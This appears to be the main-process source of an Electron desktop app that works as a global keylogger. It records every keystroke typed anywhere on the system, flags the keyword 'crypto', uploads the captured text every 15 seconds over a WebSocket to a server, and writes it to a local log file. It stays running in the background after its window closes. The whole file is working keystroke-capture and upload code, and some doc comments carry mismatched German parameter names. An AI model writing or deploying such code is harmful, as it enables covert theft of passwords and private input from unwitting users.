const { app, BrowserWindow } = require('electron');
const fs = require('fs');
const path = require('path');
const { GlobalKeyboardListener } = require('node-global-key-listener');
const SockJS = require('sockjs-client');
const Stomp = require('stompjs');

/**
 * Dynamically imports node-fetch for compatibility.
 * @param {...any} args Arguments to be passed to the fetch function.
 * @returns {Promise<any>} A promise that resolves to the fetch response.
 */
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

let mainWindow;
let listener;
let stompClient;
let sessionId;
let dataStorage = {
    text: "", 
    actions: []  
};
const userId = 1;
const keywords = ["crypto"];

// Path for the log file
const logFilePath = path.join(__dirname, 'key_log.txt');


/**
 * Establishes a WebSocket connection and creates a session for the first user.
 * @param {number} benutzerId The unique ID of the user.
 */
function connectAndCreateSession(userId) {
    const socket = new SockJS('http://localhost:8080/ws');
    stompClient = Stomp.over(socket);

    stompClient.connect({}, async (frame) => {
        console.log('Connected:', frame);
        sessionId = await createSession(userId);
        console.log('Session created with ID:', sessionId);

        // Start data gathering every 15 seconds
        startDataGathering();
    }, (error) => {
        console.error('Connection error:', error);

        // Attempt to reconnect after 15 seconds
        console.log('Attempting to reconnect in 15 seconds...');
        setTimeout(() => connectAndCreateSession(userId), 15000);
    });
}

/**
 * Sends a request to create a new session on the server.
 * @param {number} benutzerId The ID of the user for whom the session is created.
 * @returns {Promise<string|null>} The session ID if created successfully; otherwise, null.
 */
async function createSession(userId) {
    try {
        const response = await fetch(`http://localhost:8080/createSession?userId=${userId}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        const data = await response.text();
        
        if (!data) {
            throw new Error('Session ID is not defined in the response');
        }

        console.log('Session created with ID:', data);
        return data; 
    } catch (error) {
        console.error('Error creating session:', error);
        return null;
    }
}


/**
 * Starts the process of gathering and filtering data every 15 seconds.
 */
function startDataGathering() {
    setInterval(() => {
        const filteredData = filterData(dataStorage);
        sendDataToServer(filteredData);
        clearDataStorage();
    }, 15000);
}

/**
 * Retrieves the accumulated text data from the data storage.
 * @returns {string} The accumulated keystrokes as a string.
 */
function gatherData() {
    return dataStorage.text;
}

/**
 * Filters the collected data based on predefined keywords.
 * @param {Object} daten The data object containing the accumulated text.
 * @returns {Object} The filtered data with the found keywords.
 */
function filterData(data) {
    const foundKeywords = keywords.filter(keyword => data.text.includes(keyword));
    const action = foundKeywords.length > 0 
        ? `Keywords found: ${foundKeywords.join(", ")}`
        : "No specific keywords found";

    return {
        text: data.text,
        action: action
    };
}

/**
 * Sends the filtered data to the server via WebSocket.
 * @param {Object} gefilterteDaten The data object to be sent to the server.
 */
function sendDataToServer(filteredData) {
    if (!stompClient || !stompClient.connected) {
        console.error('Not connected to the server');
        return;
    }

    const keystrokeData = {
        session: { sessionId },
        text: filteredData.text,
        action: filteredData.action
    };

    stompClient.send("/app/keystroke", {}, JSON.stringify(keystrokeData));
    console.log('Data sent:', keystrokeData);

    saveDataToFile(keystrokeData);
}

/**
 * Clears the text and actions in the data storage after sending.
 */
function clearDataStorage() {
    dataStorage.text = "";
    dataStorage.actions = [];
}

/**
 * Saves the keystroke data to a log file for future reference.
 * @param {Object} tastenDaten The data object containing keystrokes and actions.
 */
function saveDataToFile(keystrokeData) {
    const logEntry = `${new Date().toISOString()} - Text: ${keystrokeData.text}, Action: ${keystrokeData.action}\n`;

    fs.appendFile(logFilePath, logEntry, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
        } else {
            console.log('Data logged to file:', logEntry.trim());
        }
    });
}


/**
 * Creates the main application window and starts listening for keyboard events.
 */
function createWindow() {
    mainWindow = new BrowserWindow({
        width: 400,
        height: 600,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
        },
    });

    mainWindow.setMenu(null);
    mainWindow.loadFile('index.html');

    mainWindow.on('closed', () => {
        mainWindow = null;
    });

    startListening();
}

/**
 * Starts listening to global keyboard events and stores the keystrokes.
 */
function startListening() {
    let isShiftActive = false;
    let isCapsLockActive = false;

    listener = new GlobalKeyboardListener();

    listener.addListener((event) => {
        if (event.name && !event.name.startsWith('MOUSE') && event.state === 'UP') {
            let keyName = event.name.toLowerCase();

            // Toggle Shift and Caps Lock states and add to text if necessary
            if (keyName === 'shift') {
                isShiftActive = event.state === 'DOWN';
                keyName = '[SHIFT]';
            } else if (keyName === 'capslock') {
                isCapsLockActive = !isCapsLockActive;
                keyName = '[CAPSLOCK]';
            }

            const specialKeys = ['backspace', 'enter', 'tab', 'ctrl', 'alt', 'shift', 'capslock', 'escape', 'shiftleft'];
            if (specialKeys.includes(keyName)) {
                keyName = ` [${keyName.toUpperCase()}] `;
            } else if (keyName === 'space') {
                keyName = ' ';
            } else if (/^[a-z]$/.test(keyName)) { 
                if (isShiftActive || isCapsLockActive) {
                    keyName = keyName.toUpperCase();
                }
            }

            // Append the formatted key to text
            dataStorage.text += keyName;

            // Improved keyword detection: check full words only
            const textWords = dataStorage.text.split(/\s+/);
            keywords.forEach(keyword => {
                if (textWords.includes(keyword.toLowerCase()) &&
                    !dataStorage.actions.includes(keyword)) {
                    dataStorage.actions.push(keyword);
                }
            });
        }
    });

    console.log('Started listening for keyboard events.');
}

app.on('ready', () => {
    // Connect to the server and create a session
    connectAndCreateSession(userId); 
    // Create the main window
    createWindow(); 
});

// Keep the app running in the background
app.on('window-all-closed', () => {
});

app.on('activate', () => {
    if (mainWindow === null) {
        createWindow();
    }
});

process.on('SIGINT', () => {
    if (listener) {
        listener.removeListener();
        console.log('Stopped listening for keyboard events.');
    }
    app.quit();
});